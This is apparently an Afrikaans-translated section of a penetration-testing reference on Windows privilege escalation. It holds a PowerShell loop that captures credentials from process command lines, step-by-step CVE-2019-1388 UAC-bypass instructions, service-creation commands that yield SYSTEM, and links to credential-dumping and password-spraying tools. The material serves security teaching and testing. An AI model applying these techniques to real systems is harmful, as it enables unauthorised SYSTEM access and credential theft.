[Lees hierdie **ander pos vir 'n meer volledige verduideliking oor hoe om meer oop handlers van prosesse en drade wat geërf is met verskillende vlakke van toestemmings (nie net volle toegang nie)** te toets en te misbruik](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Naam Pyp Kliënt Impersonation

Gedeelde geheue segmente, bekend as **pype**, maak proses kommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Naam Pype**, wat onverwante prosesse in staat stel om data te deel, selfs oor verskillende netwerke. Dit lyk na 'n kliënt/bediener argitektuur, met rolle wat gedefinieer is as **naam pype bediener** en **naam pype kliënt**.

Wanneer data deur 'n **kliënt** deur 'n pyp gestuur word, het die **bediener** wat die pyp opgestel het die vermoë om die identiteit van die **kliënt** aan te neem, mits dit die nodige **SeImpersonate** regte het. Die identifisering van 'n **bevoorregte proses** wat kommunikeer via 'n pyp wat jy kan naboots, bied 'n geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pyp wat jy opgestel het, interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, kan nuttige gidse gevind word [**hier**](named-pipe-client-impersonation.md) en [**hier**](./#from-high-integrity-to-system).

Ook laat die volgende instrument toe om **'n naam pyp kommunikasie te onderskep met 'n instrument soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie instrument laat toe om al die pype te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitering van Bevellyne vir wagwoorde**

Wanneer jy 'n skaal as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word wat **geloofsbriewe op die bevellyn deurgee**. Die skripsie hieronder vang proses bevellyne elke twee sekondes op en vergelyk die huidige toestand met die vorige toestand, waar enige verskille uitgevoer word.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Steel wagwoorde van prosesse

## Van Lae Priv Gebruiker na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Omgang

Indien jy toegang het tot die grafiese koppelvlak (via konsole of RDP) en UAC is geaktiveer, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminaal of enige ander proses soos "NT\AUTHORITY SYSTEM" vanaf 'n onbevoorregte gebruiker te hardloop.

Dit maak dit moontlik om voorregte te eskaleer en terselfdertyd UAC te omseil met dieselfde kwesbaarheid. Daarbenewens is daar geen nodigheid om enigiets te installeer nie en die binêre wat tydens die proses gebruik word, is deur Microsoft onderteken en uitgereik.

Sommige van die geraakte stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buuit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Jy het al die nodige lêers en inligting in die volgende GitHub-opberging:

https://github.com/jas502n/CVE-2019-1388

## Van Administrateur Medium na Hoë Integriteitsvlak / UAC-Omweg

Lees hierdie om **meer te leer oor Integriteitsvlakke**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Lees dan **hierdie om meer te leer oor UAC en UAC-omweë**:

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Van Hoë Integriteit na Stelsel**

### **Nuwe diens**

As jy reeds op 'n Hoë Integriteitsproses loop, kan die **oorgang na SISTEEM** maklik wees deur net 'n nuwe diens te **skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Vanaf 'n Hoë Integriteitsproses kan jy probeer om die **AlwaysInstallElevated-registrisieë** te **aktiveer** en 'n omgekeerde skaal te **installeer** deur 'n _**.msi**_ omhulsel te gebruik.\
[Meer inligting oor die betrokke registrisiesleutels en hoe om 'n _.msi_ pakket te installeer hier.](./#alwaysinstallelevated)

### Hoë + SeImpersonate-voorreg na Stelsel

**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**

### Vanaf SeDebug + SeImpersonate na Volle Token-voorregte

As jy daardie token-voorregte het (waarskynlik sal jy dit vind in 'n reeds Hoë Integriteitsproses), sal jy in staat wees om **bykans enige proses oop te maak** (nie beskermde prosesse nie) met die SeDebug-voorreg, **die token te kopieer** van die proses, en 'n **willekeurige proses met daardie token te skep**.\
Deur hierdie tegniek te gebruik, word gewoonlik **enige proses wat as STELSEL hardloop met al die token-voorregte gekies** (_ja, jy kan STELSELprosesse vind sonder al die token-voorregte_).\
**Jy kan 'n** [**voorbeeld van kode wat die voorgestelde tegniek uitvoer hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Genoemde Pype**

Hierdie tegniek word deur meterpreter gebruik om te eskaleer in `getsystem`. Die tegniek behels **die skep van 'n pyp en dan die skep/misbruik van 'n diens om op daardie pyp te skryf**. Dan sal die **bediener** wat die pyp geskep het met die **`SeImpersonate`**-voorreg in staat wees om die token van die pyp-kliënt (die diens) te **impersonate** en sodoende STELSEL-voorregte te verkry.\
As jy meer wil leer oor [**genoemde pype, moet jy hierdie lees**](./#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil lees van [**hoe om van hoë integriteit na Stelsel te gaan deur genoemde pype, moet jy hierdie lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Ontvoering

As jy daarin slaag om 'n dll te **ontvoer** wat **gelaai** word deur 'n **proses** wat as **STELSEL** hardloop, sal jy in staat wees om willekeurige kode uit te voer met daardie toestemmings. Daarom is Dll Ontvoering ook nuttig vir hierdie soort voorregeskaling, en, bovendien, is dit baie **makliker om te bereik vanaf 'n hoë integriteitsproses** aangesien dit **skryfregte** sal hê op die vouers wat gebruik word om dll's te laai.\
**Jy kan meer leer oor Dll-ontvoering hier**](dll-hijacking/)**.**

### **Van Administrateur of Netwerkdienste na Stelsel**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Van PLAASLIKE DIENS of NETWERKDIENS na volle voorregte

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Statiese impacket-binêres](https://github.com/ropnop/impacket_static_binaries)

## Nuttige gereedskap

**Die beste gereedskap om te soek na Windows plaaslike voorregeskaling vektore:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Soek na verkeerde konfigurasies en sensitiewe lêers (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Opgespoor.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Soek na moontlike verkeerde konfigurasies en versamel inligting (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Soek na verkeerde konfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP gestoorde sessie-inligting. Gebruik -Deeglik lokaal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek geloofsbriewe van Credential Manager. Opgespoor.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spuit versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-die-middel-gereedskap.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows-opname**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek na bekende privesc kwesbaarhede (VEROUDERD vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Plaaslike kontroles **(Benodig Admin-regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc kwesbaarhede (moet saamgestel word met behulp van VisualStudio) ([**voorgekompilde**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumereer die gasheer op soek na verkeerde konfigurasies (meer 'n gereedskap vir inligting insameling as privesc) (moet saamgestel word) **(**[**voorgekompilde**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek geloofsbriewe van baie sagteware (voorgekompilde exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Omskakeling van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Soek na verkeerde konfigurasie (uitvoerbare voorgekompilde in github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Soek na moontlike verkeerde konfigurasies (exe vanaf python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Gereedskap geskep gebaseer op hierdie pos (dit benodig nie toegangchk om behoorlik te werk nie, maar dit kan dit gebruik).

**Lokaal**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (plaaslike python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (plaaslike python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Jy moet die projek saamstel met die korrekte weergawe van .NET ([sien hierdie](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer-gasheer te sien, kan jy dit doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografie

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks af in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks-swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>
